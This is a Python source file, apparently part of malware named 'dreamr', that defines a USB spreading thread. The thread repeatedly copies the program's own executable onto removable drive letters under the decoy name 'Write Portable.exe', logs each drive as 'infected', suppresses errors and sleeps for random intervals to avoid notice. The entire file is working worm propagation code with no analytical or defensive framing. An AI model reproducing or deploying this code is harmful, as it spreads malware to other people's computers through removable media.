import os
import threading
import time
import random
from shutil import copyfile
from core import *

class USBSpreadThread(threading.Thread):

	# Constuctor for the spread thread
	def __init__(self):
		threading.Thread.__init__(self)
		debug("Spreader", "Initialized")

	def run(self):
		binarySource = DreamrLocation # dreamr
		driveLetters = ["A", "B", "D", "E", "F", "G", "H", "I", "J", "X", "Y", "Z"]
		while True:
			for letter in driveLetters:
				binaryTarget = "%s:\\Write Portable.exe" % letter
				try:
					copyfile(binarySource, binaryTarget)
					debug("spreader", "infected: " + letter)
				except:
					pass
			# Wait for a long time before doing it again
			time.sleep(random.randint(1000, 999999))